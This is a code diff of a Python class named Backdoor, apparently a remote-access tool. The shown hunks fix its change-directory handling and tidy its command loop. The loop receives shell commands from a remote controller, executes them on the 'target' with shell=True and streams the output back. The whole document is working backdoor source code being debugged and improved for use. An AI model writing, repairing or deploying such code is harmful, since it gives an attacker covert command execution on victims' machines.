@@ -25,12 +25,13 @@ class Backdoor:
     
     def cd(self,path):
         try:
-            print('path:',path)
+            #print('path:',path)
             fullPath = path[1:] # path will be everything following cd command
-            print('fullPath:',fullPath)
+            #print('fullPath:',fullPath)
             fullPathJoin = ' '.join(fullPath)
-            print('fullPathJoin:',fullPathJoin)
-            os.chdir(path)
+            #print('fullPathJoin:',fullPathJoin)
+            os.chdir(str(fullPathJoin))
+            #print(os.curdir)
             return f"Changing directory\n>>\"{path}\""
         except PermissionError:
             self.sendStream('PermissionError, change directory command not accepted by target')
@@ -39,7 +40,6 @@ class Backdoor:
         except OSError:
             self.sendStream('OSError, change directory command not accepted by target')
             
-        
 
     def executeCmd(self,cmd):
         cmd = subprocess.check_output(cmd,shell=True)
@@ -66,30 +66,28 @@ class Backdoor:
     def run(self):
         while True:
             #print('run1')
-            self.cmdIn = self.recvStream()
+            cmdIn = self.recvStream()
             #print(cmdIn)
             #print('run2')
-            if self.cmdIn[0] == 'bye':
+            if cmdIn[0] == 'bye':
                 #print('bye')
                 self.connection.close()
                 exit()
-            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:
-
+            elif cmdIn[0] == 'cd' and len(cmdIn) > 1:
                 #print('trying CD') #meaning cmdIn = ['cd','c:\\'] is len() = 2
-                self.cmdOut = self.cd(self.cmdIn[1]) #must pass in the entire absolute path for the argument of cd
-                self.sendStream(self.cmdOut)
+                cmdOut = self.cd(cmdIn) #must pass in the entire absolute path for the argument of cd
+                self.sendStream(cmdOut)
             else:   
                 #print('run3_PRE_TRY')
                 try:
-                    self.cmdOut = self.executeCmd(self.cmdIn)
+                    cmdOut = self.executeCmd(cmdIn)
                 except subprocess.CalledProcessError:
                     self.sendStream('Subprocess Error, shell command not accepted by target')  
                 #print('run4_POST_TRY')
-                self.cmdOut = self.cmdOut.decode('utf-8')
+                cmdOut = cmdOut.decode('utf-8')
                 #print(cmdOut)
-                self.sendStream(self.cmdOut)
+                self.sendStream(cmdOut)
                    
-
 
 try:
     args = Args()
